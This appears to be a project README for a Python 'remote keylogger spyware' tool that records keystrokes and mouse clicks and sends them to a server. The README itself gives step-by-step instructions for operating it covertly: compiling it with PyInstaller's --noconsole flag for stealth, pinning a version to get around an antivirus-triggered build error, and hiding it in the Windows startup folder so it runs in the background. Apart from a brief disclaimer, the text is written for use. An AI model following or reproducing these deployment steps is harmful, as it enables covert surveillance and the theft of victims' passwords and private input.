# Remote-keylogger-spyware
A python code for a remote keylogger application that records all key strokes while application is running on remote device and sends all recorded keystrokes to a server.

Usage of this knowledge should not be done for malicious purposes and the author is not responsible if this knowledge is used to conduct malicious activities.

# remote-keylogger.py file
> edit server-ip according to your server ip

> if you are using 'test-server.py', it will provide you a server-ip

> execution of remote-keylogger.py will start sending each recorded key and mouse click to the server

# To convert this file into an executable

1. install PyInstaller

> ' pip install pyinstaller==5.13.2 '

> use this specific version to avoid error: win32ctypes.pywin32.pywintypes.error: (225, 'BeginUpdateResourceW', 'Operation did not complete successfully because the file contains a virus or potentially unwanted software.')

2. Use this command to convert python file to an executable

> ' python -m PyInstaller --noconsole --onefile remote-keylogger.py '

> ' --noconsole ' supresses console output to maintain stealth of the application

> ' --onefile ' creates a single executable file of the code rather than an entire folder; this might raise an alert to the windows defender and it will not allow the execution of the file
 
> the process may take some time

> after completion, the application file (remote-keylogger.exe) will be available in 'dist' folder

3. To execute application on startup (hidden and running in background)

> create a shortcut of the application

> press win+r, type shell:startup, this opens startup folder

> move shortcut to the startup folder

> now when device is powered on, the keylogger will be active and hidden in background

4. To stop keylogger

> press ctrl + shift + esc, to open task manager

> find keylogger process, select and end task
